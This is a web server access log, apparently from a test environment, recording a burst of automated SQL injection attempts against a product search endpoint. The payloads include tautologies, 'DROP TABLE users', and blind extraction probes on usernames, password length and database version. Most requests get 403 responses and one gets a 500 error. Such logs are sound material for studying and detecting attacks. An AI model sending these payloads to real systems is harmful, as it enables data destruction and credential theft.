172.18.0.1 - - [06/Apr/2026:21:30:02 +0000] "GET /rest/products/search?q=test HTTP/1.1" 200 517 "-" "curl/8.18.0" "-"
172.18.0.1 - - [06/Apr/2026:21:30:24 +0000] "GET /rest/products/search?q=%27%20OR%20%271%27%3D%271 HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:21:30:24 +0000] "GET /rest/products/search?q=%27%20OR%20%271%27%3D%271%27-- HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:21:30:24 +0000] "GET /rest/products/search?q=%27%20OR%201%3D1-- HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:21:30:24 +0000] "GET /rest/products/search?q=admin%27-- HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:21:30:25 +0000] "GET /rest/products/search?q=%27%20OR%20%27x%27%3D%27x HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:21:30:25 +0000] "GET /rest/products/search?q=1%27%20OR%20%271%27%3D%271 HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:21:30:25 +0000] "GET /rest/products/search?q=%27%20OR%20%27%27%3D%27 HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:21:30:25 +0000] "GET /rest/products/search?q=1%20OR%201%3D1 HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:21:30:25 +0000] "GET /rest/products/search?q=%27%20OR%201%3D1%23 HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:21:30:25 +0000] "GET /rest/products/search?q=%22%20OR%201%3D1-- HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:21:30:25 +0000] "GET /rest/products/search?q=%27%29%20OR%20%28%271%27%3D%271 HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:21:30:25 +0000] "GET /rest/products/search?q=%27%3B%20DROP%20TABLE%20users-- HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:21:30:25 +0000] "GET /rest/products/search?q=1%27%3B%20DROP%20TABLE%20users-- HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:21:30:26 +0000] "GET /rest/products/search?q=%27%20AND%201%3D1-- HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:21:30:26 +0000] "GET /rest/products/search?q=%27%20AND%201%3D2-- HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:21:30:26 +0000] "GET /rest/products/search?q=%27%20OR%201%3D1%20ORDER%20BY%201-- HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:21:30:26 +0000] "GET /rest/products/search?q=%27%20OR%20%27a%27%3D%27a HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:21:30:26 +0000] "GET /rest/products/search?q=admin%27%23 HTTP/1.1" 500 988 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:21:30:26 +0000] "GET /rest/products/search?q=1%3B%20SELECT%20%2A%20FROM%20users-- HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:21:30:26 +0000] "GET /rest/products/search?q=%27%20OR%201%3D1%20LIMIT%201-- HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:21:30:26 +0000] "GET /rest/products/search?q=1%20AND%201%3D1 HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:21:30:27 +0000] "GET /rest/products/search?q=1%20AND%201%3D2 HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:21:30:27 +0000] "GET /rest/products/search?q=1%27%20AND%20%271%27%3D%271 HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:21:30:27 +0000] "GET /rest/products/search?q=1%27%20AND%20%271%27%3D%272 HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:21:30:27 +0000] "GET /rest/products/search?q=%27%20AND%20SUBSTRING%28username%2C1%2C1%29%3D%27a%27-- HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:21:30:27 +0000] "GET /rest/products/search?q=%27%20AND%20LENGTH%28password%29%3E5-- HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:21:30:27 +0000] "GET /rest/products/search?q=1%20AND%20SUBSTRING%28%40%40version%2C1%2C1%29%3D%275%27 HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:21:30:27 +0000] "GET /rest/products/search?q=%27%20AND%20ASCII%28SUBSTRING%28%28SELECT%20database%28%29%29%2C1%2C1%29%29%3E64-- HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
172.18.0.1 - - [06/Apr/2026:21:30:27 +0000] "GET /rest/products/search?q=%27%20AND%201%3D%28SELECT%201%20FROM%20users%20WHERE%20username%3D%27admin%27%29-- HTTP/1.1" 403 146 "-" "python-requests/2.31.0" "-"
